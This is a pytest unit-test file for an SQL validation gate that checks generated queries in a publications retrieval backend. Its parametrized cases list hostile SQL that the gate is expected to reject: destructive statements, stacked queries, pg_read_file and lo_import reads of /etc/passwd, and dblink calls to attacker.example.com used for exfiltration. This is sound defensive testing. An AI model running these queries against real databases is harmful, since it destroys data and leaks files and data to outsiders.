"""Unit tests for AST Security Validator and SQL Sanitization Gate.

Docs Reference: docs/05 Retrieval Rag Design.md §5.1, docs/08 Security.md §2.
"""

from __future__ import annotations

import pytest
from backend.app.services.retrievers.sql_security import (
    ALLOWED_TABLES,
    SqlSecurityError,
    escape_like_pattern,
    validate_and_sanitize_sql,
)


class TestSqlSecurityGate:
    """Test AST security checks and enforcement."""

    def test_valid_select_query(self):
        sql = "SELECT publication_id, title, year FROM publications WHERE year = 2025 ORDER BY citation_count DESC LIMIT 10;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "SELECT" in sanitized
        assert "FROM publications" in sanitized
        assert "LIMIT 10" in sanitized

    def test_enforce_limit_if_missing(self):
        sql = "SELECT publication_id, title FROM publications;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT 50" in sanitized

    def test_reject_select_star(self):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql("SELECT * FROM publications;")
        assert "wildcard" in str(exc_info.value.message).lower()

    def test_reject_qualified_star(self):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql("SELECT p.* FROM publications p;")
        assert "wildcard" in str(exc_info.value.message).lower()

    def test_reject_unknown_column(self):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql("SELECT password FROM publications;")
        assert "whitelist" in str(exc_info.value.message).lower()

    def test_reject_unknown_qualified_column(self):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql("SELECT a.nickname FROM authors a;")
        assert "allowlist" in str(exc_info.value.message).lower()

    def test_accept_order_by_select_alias_and_placeholders(self):
        sql = (
            "SELECT a.author_name, COUNT(DISTINCT pa.publication_id) AS publication_count "
            "FROM authors a JOIN pub_author pa ON pa.author_id = a.author_id "
            "JOIN publications p ON p.publication_id = pa.publication_id "
            "WHERE p.year = $1 GROUP BY a.author_name "
            "ORDER BY publication_count DESC, a.author_name ASC LIMIT 5;"
        )
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT 5" in sanitized

    def test_clamp_excessive_limit(self):
        sql = "SELECT publication_id, title FROM publications LIMIT 1000;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT 50" in sanitized

    def test_single_row_aggregate_exempt_from_limit(self):
        """FR3.4: scalar aggregates must not gain an injected LIMIT."""
        sql = "SELECT COUNT(DISTINCT p.publication_id) AS total_publications FROM publications p WHERE p.year = 2025;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT" not in sanitized.upper()

    def test_grouped_aggregate_keeps_limit_enforcement(self):
        sql = """
        SELECT a.author_name, COUNT(pa.publication_id) AS publication_count
        FROM authors a
        JOIN pub_author pa ON pa.author_id = a.author_id
        GROUP BY a.author_name;
        """
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT 50" in sanitized

    def test_union_inner_branch_limits_clamped(self):
        sql = """
        SELECT publication_id FROM publications LIMIT 1000
        UNION ALL
        SELECT publication_id FROM publications LIMIT 5;
        """
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT 1000" not in sanitized
        assert "LIMIT 50" in sanitized
        assert "LIMIT 5" in sanitized

    def test_union_of_aggregates_stays_limit_free(self):
        sql = """
        SELECT COUNT(*) AS c FROM publications
        UNION ALL
        SELECT COUNT(*) AS c FROM authors;
        """
        sanitized = validate_and_sanitize_sql(sql)
        assert "LIMIT" not in sanitized.upper()

    def test_double_count_prevention_on_junction_join(self):
        """Verify COUNT is automatically upgraded to DISTINCT when junction tables are joined."""
        sql = """
        SELECT a.author_name, COUNT(pa.publication_id) AS publication_count
        FROM authors a
        JOIN pub_author pa ON pa.author_id = a.author_id
        GROUP BY a.author_name;
        """
        sanitized = validate_and_sanitize_sql(sql)
        assert "COUNT(DISTINCT pa.publication_id)" in sanitized or "COUNT(DISTINCT" in sanitized

    def test_junction_count_normalized_to_publication_grain(self):
        sql = """
        SELECT COUNT(a.author_id) AS c
        FROM authors a
        JOIN pub_author pa ON pa.author_id = a.author_id;
        """
        sanitized = validate_and_sanitize_sql(sql)
        assert "COUNT(DISTINCT pa.publication_id)" in sanitized

    def test_junction_count_star_normalized_to_publication_grain(self):
        sql = "SELECT COUNT(*) AS c FROM publications p JOIN pub_author pa ON pa.publication_id = p.publication_id;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "COUNT(DISTINCT pa.publication_id)" in sanitized

    def test_plain_count_star_untouched_without_junction(self):
        sql = "SELECT COUNT(*) AS c FROM publications;"
        sanitized = validate_and_sanitize_sql(sql)
        assert "COUNT(*)" in sanitized
        assert "LIMIT" not in sanitized.upper()

    def test_aggregate_intent_rejects_plain_list(self):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(
                "SELECT title FROM publications;",
                aggregate_intent=True,
            )
        assert "aggregate" in str(exc_info.value.message).lower()

    def test_aggregate_intent_accepts_grouped_query(self):
        sql = """
        SELECT a.author_name, COUNT(DISTINCT pa.publication_id) AS publication_count
        FROM authors a
        JOIN pub_author pa ON pa.author_id = a.author_id
        GROUP BY a.author_name;
        """
        sanitized = validate_and_sanitize_sql(sql, aggregate_intent=True)
        assert "GROUP BY" in sanitized

    @pytest.mark.parametrize(
        "destructive_sql,expected_msg",
        [
            ("DROP TABLE publications;", "Only SELECT queries are permitted"),
            ("DELETE FROM authors WHERE author_id = '123';", "Only SELECT queries are permitted"),
            ("UPDATE publications SET title = 'hacked';", "Only SELECT queries are permitted"),
            ("INSERT INTO keywords (keyword) VALUES ('malicious');", "Only SELECT queries are permitted"),
            ("ALTER TABLE publications ADD COLUMN hack TEXT;", "Only SELECT queries are permitted"),
            ("TRUNCATE TABLE chunks;", "Only SELECT queries are permitted"),
            ("GRANT ALL PRIVILEGES ON DATABASE postgres TO public;", "Only SELECT queries are permitted"),
        ],
    )
    def test_reject_destructive_statements(self, destructive_sql: str, expected_msg: str):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(destructive_sql)
        assert expected_msg.lower() in str(exc_info.value.message).lower()

    @pytest.mark.parametrize(
        "unauthorized_table_sql",
        [
            "SELECT * FROM pg_tables;",
            "SELECT * FROM information_schema.columns;",
            "SELECT * FROM pg_catalog.pg_user;",
            "SELECT * FROM secret_passwords;",
            "SELECT * FROM publications WHERE publication_id IN (SELECT id FROM unauthorized_table);",
        ],
    )
    def test_reject_unauthorized_tables(self, unauthorized_table_sql: str):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(unauthorized_table_sql)
        assert "is forbidden" in str(exc_info.value.message).lower()

    @pytest.mark.parametrize(
        "prohibited_func_sql",
        [
            "SELECT pg_sleep(5) FROM publications;",
            "SELECT pg_read_file('/etc/passwd') FROM publications;",
            "SELECT query_to_xml('SELECT 1', true, false, '') FROM publications;",
            "SELECT current_setting('search_path');",
        ],
    )
    def test_reject_prohibited_functions(self, prohibited_func_sql: str):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(prohibited_func_sql)
        assert "prohibited function" in str(exc_info.value.message).lower()

    def test_reject_multiple_statements(self):
        sql = "SELECT publication_id FROM publications; DROP TABLE authors;"
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(sql)
        assert "multiple statements" in str(exc_info.value.message).lower()

    def test_reject_empty_sql(self):
        with pytest.raises(SqlSecurityError):
            validate_and_sanitize_sql("")

    def test_escape_like_pattern_wraps_and_escapes_wildcards(self):
        assert escape_like_pattern("indo%nesia_\\x") == "%indo\\%nesia\\_\\\\x%"
        assert escape_like_pattern("ITB") == "%ITB%"

    @pytest.mark.parametrize(
        "exfil_sql",
        [
            # Outbound connection to another PostgreSQL instance. Not `pg_`
            # prefixed, so the exact-name list alone does not catch it, and the
            # read-only role does not contain it: the exfiltration path is the
            # network call, not the privileges.
            "SELECT dblink_exec('host=attacker.example.com dbname=prod', $$SELECT 1$$) FROM publications;",
            "SELECT dblink_connect('host=attacker.example.com') FROM publications;",
            # Server-side file I/O / large objects.
            "SELECT lo_import('/etc/passwd') FROM publications;",
            "SELECT lo_get(1) FROM publications;",
            # Any other `pg_`-prefixed internal, not just the enumerated ones.
            "SELECT pg_ls_dir('/') FROM publications;",
        ],
    )
    def test_reject_prefix_prohibited_functions(self, exfil_sql: str):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(exfil_sql)
        assert "prohibited function" in str(exc_info.value.message).lower()

    @pytest.mark.parametrize(
        "locking_sql",
        [
            "SELECT publication_id FROM publications FOR UPDATE;",
            "SELECT publication_id FROM publications FOR SHARE;",
            "SELECT publication_id FROM publications FOR NO KEY UPDATE;",
        ],
    )
    def test_reject_row_locking_clauses(self, locking_sql: str):
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(locking_sql)
        assert "locking" in str(exc_info.value.message).lower()

    def test_row_locking_rejection_is_retryable_shape(self):
        """The gate raises SqlSecurityError (mapped to HTTP 422 upstream), so a
        rejected FOR UPDATE must not surface as a raw driver error."""
        with pytest.raises(SqlSecurityError):
            validate_and_sanitize_sql(
                "SELECT a.author_name FROM authors a FOR UPDATE;"
            )



    def test_reject_ambiguous_unqualified_column(self):
        """`publication_id` is declared by chunks, pub_author and publications. An
        unqualified reference cannot be validated against one table, so it must be
        rejected rather than checked against the union of all three."""
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(
                "SELECT publication_id FROM chunks c "
                "JOIN publications p ON p.publication_id = c.publication_id;"
            )
        assert "ambiguous" in str(exc_info.value.message).lower()

    def test_ambiguity_error_names_every_candidate_table(self):
        """The retryable message must name the tables so the repair round trip
        can qualify the column without guessing."""
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(
                "SELECT publication_id FROM chunks c "
                "JOIN publication_references r ON r.publication_id = c.publication_id;"
            )
        message = str(exc_info.value.message)
        assert "chunks" in message
        assert "pub" in message or "publication_references" in message

    def test_allow_unqualified_column_unique_to_one_table_in_statement(self):
        """A name declared by exactly one table in the FROM list is unambiguous,
        so PostgreSQL's resolution is deterministic and the per-table check still
        applies. Rejecting this would be stricter than necessary and would turn
        legitimate subqueries into 422s."""
        sanitized = validate_and_sanitize_sql(
            "SELECT chunk_text FROM chunks c "
            "JOIN publications p ON p.publication_id = c.publication_id;"
        )
        assert "chunk_text" in sanitized

    def test_unqualified_column_must_still_be_allowlisted(self):
        """Uniqueness does not bypass the whitelist: a column declared by no
        allowlisted table is still rejected."""
        with pytest.raises(SqlSecurityError) as exc_info:
            validate_and_sanitize_sql(
                "SELECT nonexistent_column FROM publications;"
            )
        assert "whitelist" in str(exc_info.value.message).lower()

    def test_allow_unqualified_column_in_single_table_query(self):
        """One table means no ambiguity, so qualification is not required."""
        sanitized = validate_and_sanitize_sql(
            "SELECT publication_id, title FROM publications;"
        )
        assert "FROM publications" in sanitized

    def test_allow_qualified_columns_in_multi_table_query(self):
        """The intended form still passes: qualification makes the per-table
        whitelist check meaningful again."""
        sanitized = validate_and_sanitize_sql(
            "SELECT c.chunk_id, p.title FROM chunks c "
            "JOIN publications p ON p.publication_id = c.publication_id;"
        )
        assert "c.chunk_id" in sanitized
        assert "p.title" in sanitized

    def test_allow_order_by_alias_in_multi_table_query(self):
        """ORDER BY on a projected alias is unqualified by design and must not
        be rejected by the ambiguity rule."""
        sanitized = validate_and_sanitize_sql(
            "SELECT a.author_name AS author, COUNT(pa.publication_id) AS n "
            "FROM authors a JOIN pub_author pa ON pa.author_id = a.author_id "
            "GROUP BY a.author_name ORDER BY n DESC;"
        )
        assert "ORDER BY" in sanitized.upper()
